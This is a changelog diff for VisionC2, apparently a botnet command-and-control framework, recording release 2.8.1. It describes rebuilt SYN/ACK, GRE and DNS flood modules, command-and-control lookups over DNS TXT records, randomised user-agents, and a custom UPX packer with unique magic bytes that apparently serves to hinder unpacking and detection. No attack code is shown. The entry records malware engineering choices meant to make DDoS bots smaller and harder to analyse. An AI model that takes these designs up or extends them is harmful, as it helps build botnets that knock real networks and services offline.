@@ -3,6 +3,26 @@
 
 All notable changes to the VisionC2 project are documented in this file.
 
+## [2.8.1] - 2026-04-10
+
+### Changed
+- **Removed gopacket dependency** — TCP SYN/ACK flood (`dragonite`, `tyranitar`) and GRE flood (`metagross`) now use raw 20-byte header serialization via `encoding/binary` instead of `gopacket.SerializeLayers()`; eliminates ~300-500KB from binary
+- **Removed miekg/dns dependency** — DNS flood (`salamence`) and C2 TXT resolution (`darkrai`) now use raw DNS wire format construction and parsing; `encodeDNSQuery()`, `parseDNSTXTResponse()`, `skipDNSName()` helpers handle query building and response extraction; eliminates ~50-100KB from binary
+- **Replaced 546 hardcoded user-agents with 18 template-based generators** — `uaPool` stores format strings + version ranges; `randUA()` picks a random template and version at runtime via `fmt.Sprintf`; produces equivalent browser diversity at ~1/10 the binary cost; dropped all pre-2024 entries (IE/Trident, Chrome 37-45, Win NT 6.x, iPad OS 7/8)
+- **UPX packer updated** — `tools/upx` replaced with fresh VPX build using unique hex magic 
+
+### Fixed
+- **Build script UPX packing broken** — `cp` creates files with 0000 permissions in sandboxed environments; UPX refused to pack with `IOException: file is write protected` and `CantPackException: file not executable`; added `chmod 755` on `.tmp` files before packing
+
+### Removed
+- **`github.com/google/gopacket`** — no longer a dependency (was only used for 3 L4 attack functions)
+- **`github.com/miekg/dns`** — no longer a dependency (was only used for DNS flood + C2 resolution); also drops transitive deps `golang.org/x/mod`, `golang.org/x/sync`, `golang.org/x/tools`
+
+### Binary Size
+- Packed binaries (--lzma) now **1.7-2.1MB** across 11 supported architectures (down from 2.1-2.5MB)
+- Unpacked stripped binaries reduced from ~7.5-8MB to ~6.0-6.7MB per architecture
+- MIPS64, MIPS64LE, s390x remain unpacked (UPX does not support these ELF formats)
+
 ## [2.8.0] - 2026-04-06
 
 ### Added
